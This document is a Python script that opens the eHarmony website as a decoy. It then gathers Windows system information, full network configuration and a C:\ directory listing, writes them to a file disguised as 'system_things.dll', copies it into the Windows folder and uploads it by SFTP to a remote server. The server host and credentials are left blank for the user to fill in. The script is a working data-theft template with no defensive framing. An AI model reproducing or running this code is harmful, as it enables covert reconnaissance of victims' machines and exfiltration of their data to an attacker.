import sys
import webbrowser
import os
import subprocess
import shutil

def install_dependencies():
    try:
        import paramiko
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'paramiko'])

install_dependencies()
import paramiko

sys_list = []
data_list = []
dir_list = []

def open_browser():
    # OPENS EHARMONY WEBSITE
    webbrowser.open('http://www.eharmony.com.au/')

def get_system_info():
    # FINDS SYSTEM INFORMATION
    print('<<SYSTEM INFORMATION>>')
    ID = subprocess.check_output(
        ['systeminfo'],
        text=True,
        encoding='utf-8',
        errors='replace'  
    )

    for line in ID.splitlines():
        cleaned = line.strip()
        if cleaned:
            sys_list.append(cleaned)
            print(cleaned)

def get_network_info():
    # FINDS NETWORK INFORMATION
    print('<<NETWORK INFORMATION>>')
    data = subprocess.check_output(
        ['ipconfig', '/all'],
        text=True,
        encoding='utf-8',
        errors='replace'
    )

    for line in data.splitlines():
        cleaned = line.strip()
        if cleaned:
            data_list.append(cleaned)
            print(cleaned)

def get_directories():
    # FINDS DIRECTORIES IN C DRIVE
    print('<<C:\\ DIRECTORIES>>')
    print()
    DIR = os.listdir(r'C:\\')

    for line in DIR:
        dir_list.append(line)
        print(line)

def write_to_file():
    # CREATES AND WRITES INFO TO .DLL FILE IN DIRECTORY
    f = open('system_things.dll', 'w')
    f.write('<<SYSTEM INFORMATION>> \n\n')
    for itemFile in sys_list:
        f.write(itemFile + '\n')
    f.write('\n\n')
    f.write('<<NETWORK INFORMATION>> \n\n')
    for itemFile in data_list:
        f.write(itemFile + '\n')
    f.write('\n\n')
    f.write('<<C:\\ DIRECTORIES>> \n\n')
    for itemFile in dir_list:
        f.write(itemFile + '\n')
    f.close()

def copy_dll_to_windows():
    # COPIES .DLL FILE TO WINDOWS FOLDER
    original = 'system_things.dll'
    target = r''  # Change directory path as needed

    shutil.copyfile(original, target)

def send_dll_to_sftp():
    # SENDS .DLL FILE TO AN SFTP SERVER
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname='', username='', password='', allow_agent=False, look_for_keys=False) # Change hostname, username, and password as needed

    sftp = client.open_sftp()
    sftp.put(r'', '')  # Change from and to paths as needed
    sftp.close()

def main():
    open_browser()
    get_system_info()
    get_network_info()
    get_directories()
    write_to_file()
    copy_dll_to_windows()
    send_dll_to_sftp()

if __name__ == '__main__':
    main()
